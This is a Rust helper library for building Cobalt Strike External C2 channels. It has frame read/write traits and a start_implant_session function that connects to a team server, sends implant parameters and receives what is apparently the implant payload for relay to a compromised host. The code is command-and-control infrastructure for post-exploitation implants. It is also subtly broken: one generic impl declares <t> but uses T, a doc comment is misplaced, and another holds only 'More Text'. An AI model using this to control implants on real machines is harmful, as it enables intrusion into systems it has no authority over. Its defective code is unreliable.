#![warn(missing_docs)]

//! Helper utilities for creating [external c2][1] systems for [cobaltstrike][2].
//!
//! ![C2](https://i.ibb.co/Cszd81H/externalc2.png)
//!
//!
//!
//![1]: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_external-c2.htm
//! [2]: https://www.cobaltstrike.com/

use async_trait::async_trait;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{TcpStream, ToSocketAddrs},
};

/// Reads and writes cobaltstrike frames from an asynchronous source.
#[async_trait]
pub trait CSFrameRead {
    /// Write a single frame.


    /// Reads a single frame.
    async fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
}

#[async_trait]
pub trait CSFrameWrite {
    async fn write_frame(
        &mut self,
        data: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>>;
}

#[async_trait]
impl<T> CSFrameWrite for T
where
    T: AsyncWriteExt + std::marker::Unpin + std::marker::Send,
{
    async fn write_frame(
        &mut self,
        data: &[u8],
    ) -> Result<(), Box<dyn std::error::Error>> {
        let size: u32 = data.len().try_into()?;
        self.write_u32_le(size).await?;
        self.write_all(data).await?;
        return Ok(());
    }
}
#[async_trait]
impl<t> CSFrameRead for T where T: AsyncReadExt + std::marker::Unpin + std::marker::Send
{
    async fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let size = self.read_u32_le().await?.try_into()?;
        let mut buf: Vec<u8> = vec![0; size];
        self.read_exact(buf.as_mut_slice()).await?;
        return Ok(buf);
    }
}

/// Starts a session with the team server.
///
/// More Text
pub async fn start_implant_session<A: ToSocketAddrs, S: AsRef<str>>(
    ts_address: &A,
    arch: S,
    pipename: S,
) -> Result<(Vec<u8>, TcpStream), Box<dyn std::error::Error>> {
    let mut conn = TcpStream::connect(ts_address).await?;
    conn.write_frame(format!("arch={}", arch.as_ref()).as_bytes())
        .await?;
    conn.write_frame(format!("pipename={}", pipename.as_ref()).as_bytes())
        .await?;
    conn.write_frame("block=500".as_bytes()).await?;
    conn.write_frame("go".as_bytes()).await?;
    let res = conn.read_frame().await?;
    return Ok((res, conn));
}
